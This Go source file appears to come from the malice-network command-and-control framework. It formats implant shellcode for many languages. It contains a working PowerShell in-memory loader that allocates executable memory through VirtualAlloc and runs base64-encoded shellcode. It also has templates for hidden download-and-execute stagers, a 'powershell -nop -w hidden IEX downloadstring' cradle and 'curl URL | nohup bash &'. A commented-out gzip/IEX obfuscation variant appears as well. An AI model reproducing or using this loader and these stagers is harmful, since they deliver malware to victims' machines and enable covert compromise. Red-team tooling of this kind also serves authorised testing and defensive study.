package formatutils

import (
	"encoding/base64"
	"fmt"
	"github.com/chainreactors/malice-network/helper/consts"
	"github.com/chainreactors/malice-network/helper/cryptography"
	"github.com/chainreactors/malice-network/helper/encoders"
	"github.com/chainreactors/malice-network/helper/proto/client/clientpb"
	"os"
	"path/filepath"
	"strings"
)

type FormatResult struct {
	Data      []byte
	Extension string
}

type FormatInfo struct {
	Extension     string
	Desc          string
	Converter     func([]byte) []byte
	SupportRemote bool
	Usage         func(string) string
}

type Formatter map[string]*FormatInfo

var SupportedFormats = Formatter{
	consts.FormatExecutable: {
		Extension: ".exe", Desc: "executable format", Converter: func(data []byte) []byte { return data },
	},
	consts.FormatRaw: {
		Extension: ".bin", Desc: "raw binary format", Converter: func(data []byte) []byte { return data },
	},
	consts.FormatC: {
		Extension: ".c", Desc: "C language format", Converter: toC,
	},
	consts.FormatCSharp: {
		Extension: ".cs", Desc: "C# language format", Converter: toCSharp,
	},
	consts.FormatJava: {
		Extension: ".java", Desc: "Java language format", Converter: toJava,
	},
	consts.FormatGolang: {
		Extension: ".go", Desc: "Go language format", Converter: toGo,
	},
	consts.FormatPython: {
		Extension: ".py", Desc: "Python language format", Converter: toPython,
	},
	consts.FormatPerl: {
		Extension: ".pl", Desc: "Perl language format", Converter: toPerl,
	},
	consts.FormatRuby: {
		Extension: ".rb", Desc: "Ruby language format", Converter: toRuby,
	},
	consts.FormatBash: {
		Extension: ".sh", Desc: "Bash script format", Converter: toBash,
	},
	consts.FormatPowerShell: {
		Extension: ".ps1", Desc: "PowerShell script format", Converter: toPowerShell,
	},
	consts.FormatHexOneLine: {
		Extension: ".hex", Desc: "hexadecimal format", Converter: toHexOneLine,
	},
	consts.FormatHexMultiLine: {
		Extension: ".hex", Desc: "hexadecimal format", Converter: toHexMultiLine,
	},
	consts.FormatNum: {
		Extension: ".txt", Desc: "numeric format", Converter: toNum,
	},
	consts.FormatDword: {
		Extension: ".txt", Desc: "dword format", Converter: toDword,
	},
	consts.FormatJavaScriptBE: {
		Extension: ".js", Desc: "JavaScript big-endian format", Converter: func(data []byte) []byte { return toJavaScript(data, true) },
	},
	consts.FormatJavaScriptLE: {
		Extension: ".js", Desc: "JavaScript little-endian format", Converter: func(data []byte) []byte { return toJavaScript(data, false) },
	},
	consts.FormatVBScript: {
		Extension: ".vbs", Desc: "VBScript format", Converter: toVBScript,
	},
	consts.FormatVBApplication: {
		Extension: ".vba", Desc: "VBA application format", Converter: toVBApplication,
	},
	consts.FormatPowerShellRemote: {
		Extension: ".ps1", Desc: "Execute ShellCode By PowerShell",
		Converter:     toPowershellRemote,
		SupportRemote: true,
		Usage:         PowershellRemoteUsage,
	},
	consts.FormatCurlRemote: {
		Extension: ".bash", Desc: "Execute ELF by curl",
		Converter:     toPowershellRemote,
		SupportRemote: true,
		Usage:         CurlRemoteUsage,
	},
}

// GetFormatsWithDescriptions returns a map of format names to descriptions
func GetFormatsWithDescriptions() map[string]string {
	result := make(map[string]string)
	for format, info := range SupportedFormats {
		result[format] = info.Desc
	}
	return result
}

func IsSupportedRemote(format string) bool {
	if info, exists := SupportedFormats[strings.ToLower(format)]; exists {
		return info.SupportRemote
	}
	return false
}

// Convert converts raw shellcode bytes to the specified format
func (formatter Formatter) Convert(data []byte, format string) (*FormatResult, error) {
	if len(data) == 0 {
		return nil, fmt.Errorf("empty data")
	}

	formatInfo := formatter[strings.ToLower(format)]
	if formatInfo == nil {
		return nil, fmt.Errorf("unsupported format: %s", format)
	}

	convertedData := formatInfo.Converter(data)
	return &FormatResult{
		Data:      convertedData,
		Extension: formatInfo.Extension,
	}, nil
}

func Convert(data []byte, format string) (*FormatResult, error) {
	return SupportedFormats.Convert(data, format)
}

func ConvertArtifact(artifact *clientpb.Artifact, format string) (*clientpb.Artifact, error) {
	if format == "" || format == consts.FormatExecutable {
		return artifact, nil
	}

	filename := filepath.Join(encoders.UUID())
	if err := os.WriteFile(filename, artifact.Bin, 0644); err != nil {
		return nil, err
	}
	shellcode, err := SRDIArtifact(filename, artifact.Platform, artifact.Arch, artifact.Type == consts.CommandBuildPulse)
	if err != nil {
		return nil, fmt.Errorf("failed to convert: %s", err)
	}
	if err := os.Remove(filename); err != nil {
		return nil, fmt.Errorf("failed to remove file: %s", err)
	}
	convert, err := Convert(shellcode, format)
	if err != nil {
		return nil, err
	}

	artifact.Bin = convert.Data
	artifact.Format = format
	return artifact, nil
}

// Helper functions for format conversion
func toC(data []byte) []byte {
	var result strings.Builder
	result.WriteString("unsigned char buf[] = \n\"")

	for i, b := range data {
		if i > 0 && i%16 == 0 {
			result.WriteString("\"\n\"")
		}
		result.WriteString(fmt.Sprintf("\\x%02x", b))
	}
	result.WriteString("\";")
	return []byte(result.String())
}

func toCSharp(data []byte) []byte {
	var result strings.Builder
	result.WriteString(fmt.Sprintf("byte[] buf = new byte[%d] {", len(data)))

	for i, b := range data {
		if i > 0 {
			result.WriteString(",")
		}
		if i%16 == 0 {
			result.WriteString("\n    ")
		} else {
			result.WriteString(" ")
		}
		result.WriteString(fmt.Sprintf("0x%02x", b))
	}
	result.WriteString("\n};")
	return []byte(result.String())
}

func toJava(data []byte) []byte {
	var result strings.Builder
	result.WriteString("byte buf[] = new byte[]\n{\n")

	for i, b := range data {
		if i > 0 {
			result.WriteString(",")
		}
		if i%8 == 0 {
			result.WriteString("\n    ")
		} else {
			result.WriteString(" ")
		}
		result.WriteString(fmt.Sprintf("(byte) 0x%02x", b))
	}
	result.WriteString("\n};\n")
	return []byte(result.String())
}

func toGo(data []byte) []byte {
	var result strings.Builder
	result.WriteString("buf := []byte{")

	for i, b := range data {
		if i > 0 {
			result.WriteString(",")
		}
		if i%16 == 0 {
			result.WriteString("\n    ")
		} else {
			result.WriteString(" ")
		}
		result.WriteString(fmt.Sprintf("0x%02x", b))
	}
	result.WriteString("\n}")
	return []byte(result.String())
}

func toPython(data []byte) []byte {
	var result strings.Builder
	result.WriteString("buf = b\"")

	for i, b := range data {
		if i > 0 && i%16 == 0 {
			result.WriteString("\"\n")
			result.WriteString("buf += b\"")
		}
		result.WriteString(fmt.Sprintf("\\x%02x", b))
	}
	result.WriteString("\"")
	return []byte(result.String())
}

func toPerl(data []byte) []byte {
	var result strings.Builder
	result.WriteString("my $buf = \n\"")

	for i, b := range data {
		if i > 0 && i%16 == 0 {
			result.WriteString("\" .\n\"")
		}
		result.WriteString(fmt.Sprintf("\\x%02x", b))
	}
	result.WriteString("\";")
	return []byte(result.String())
}

func toRuby(data []byte) []byte {
	var result strings.Builder
	result.WriteString("buf = \n\"")

	for i, b := range data {
		if i > 0 && i%16 == 0 {
			result.WriteString("\" +\n\"")
		}
		result.WriteString(fmt.Sprintf("\\x%02x", b))
	}
	result.WriteString("\"")
	return []byte(result.String())
}

func toBash(data []byte) []byte {
	var result strings.Builder
	result.WriteString("export buf=\\\n$'")

	for i, b := range data {
		if i > 0 && i%16 == 0 {
			result.WriteString("'\\\n$'")
		}
		result.WriteString(fmt.Sprintf("\\x%02x", b))
	}
	result.WriteString("'")
	return []byte(result.String())
}

func toPowerShell(data []byte) []byte {
	var result strings.Builder
	result.WriteString("$buf = @(")

	for i, b := range data {
		if i > 0 {
			result.WriteString(",")
		}
		if i%16 == 0 {
			result.WriteString("\n    ")
		} else {
			result.WriteString(" ")
		}
		result.WriteString(fmt.Sprintf("0x%02x", b))
	}
	result.WriteString("\n)")
	return []byte(result.String())
}

func toHexOneLine(data []byte) []byte {
	var result strings.Builder
	for _, b := range data {
		result.WriteString(fmt.Sprintf("%02x", b))
	}
	return []byte(result.String())
}

func toHexMultiLine(data []byte) []byte {
	var result strings.Builder
	for i, b := range data {
		if i > 0 && i%16 == 0 {
			result.WriteString("\n")
		}
		result.WriteString(fmt.Sprintf("%02x", b))
	}
	return []byte(result.String())
}

func toNum(data []byte) []byte {
	var result strings.Builder
	for i, b := range data {
		if i > 0 {
			result.WriteString(",")
		}
		if i%16 == 0 {
			result.WriteString("\n")
		}
		result.WriteString(fmt.Sprintf("%d", b))
	}
	return []byte(result.String())
}

func toDword(data []byte) []byte {
	var result strings.Builder
	// Pad data to multiple of 4 bytes
	padded := make([]byte, len(data))
	copy(padded, data)
	for len(padded)%4 != 0 {
		padded = append(padded, 0)
	}

	for i := 0; i < len(padded); i += 4 {
		if i > 0 {
			result.WriteString(",")
		}
		if i%16 == 0 {
			result.WriteString("\n")
		}
		dword := uint32(padded[i]) | uint32(padded[i+1])<<8 | uint32(padded[i+2])<<16 | uint32(padded[i+3])<<24
		result.WriteString(fmt.Sprintf("0x%08x", dword))
	}
	return []byte(result.String())
}

func toJavaScript(data []byte, bigEndian bool) []byte {
	var result strings.Builder
	result.WriteString("var buf = [")

	for i, b := range data {
		if i > 0 {
			result.WriteString(",")
		}
		if i%16 == 0 {
			result.WriteString("\n    ")
		} else {
			result.WriteString(" ")
		}
		result.WriteString(fmt.Sprintf("0x%02x", b))
	}
	result.WriteString("\n];")
	return []byte(result.String())
}

func toVBScript(data []byte) []byte {
	if len(data) == 0 {
		return []byte("buf=\"\"")
	}

	var result strings.Builder
	result.WriteString(fmt.Sprintf("buf=Chr(%d)", data[0]))

	for i := 1; i < len(data); i++ {
		if i%100 == 0 {
			result.WriteString("\r\nbuf=buf")
		}
		result.WriteString(fmt.Sprintf("&Chr(%d)", data[i]))
	}
	return []byte(result.String())
}

func toVBApplication(data []byte) []byte {
	if len(data) == 0 {
		return []byte("buf = Array()")
	}

	var result strings.Builder
	result.WriteString("buf = Array(")

	for i, b := range data {
		if i > 0 {
			result.WriteString(",")
		}
		if i > 1 && i%80 == 0 {
			result.WriteString(" _\r\n")
		}
		result.WriteString(fmt.Sprintf("%d", b))
	}
	result.WriteString(")\r\n")
	return []byte(result.String())
}

func toPowershellRemote(data []byte) []byte {
	base64Shellcode := base64.StdEncoding.EncodeToString(data)
	ps_x64_template_0 := `Set-StrictMode -Version 2

function func_get_proc_address {
	Param ($var_module, $var_procedure)		
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}

function func_get_delegate_type {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
	)

	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')

	return $var_type_builder.CreateType()
}

If ([IntPtr]::size -eq 8) {
	[Byte[]]$var_code = [System.Convert]::FromBase64String('%s')

	$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
	$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
	[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)

	$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
	$var_runme.Invoke([IntPtr]::Zero)
}
`
	ps_x64_data_0 := fmt.Sprintf(ps_x64_template_0, base64Shellcode)
	//ps_x64_template_1 := `$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%s"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();`
	//ps_x64_template_0_base64 := base64.StdEncoding.EncodeToString([]byte(ps_x64_data_0))
	//ps_x64_data_1 := fmt.Sprintf(ps_x64_template_1, ps_x64_template_0_base64)
	return []byte(ps_x64_data_0)
}

func PowershellRemoteUsage(powershellURL string) string {
	template := `powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('%s'))"`
	return fmt.Sprintf(template, powershellURL)
}

func CurlRemoteUsage(url string) string {
	template := `curl %s | nohup bash &`
	return fmt.Sprintf(template, url)
}

func Encode(name, format string) string {
	encryptArtifactName, _ := cryptography.EncryptWithGlobalKey([]byte(name))
	hexEncryptArtifactName := cryptography.BytesToHex(encryptArtifactName)

	encryptFormat, _ := cryptography.EncryptWithGlobalKey([]byte(format))
	hexEncryptFormat := cryptography.BytesToHex(encryptFormat)
	return hexEncryptArtifactName + "/" + hexEncryptFormat
}
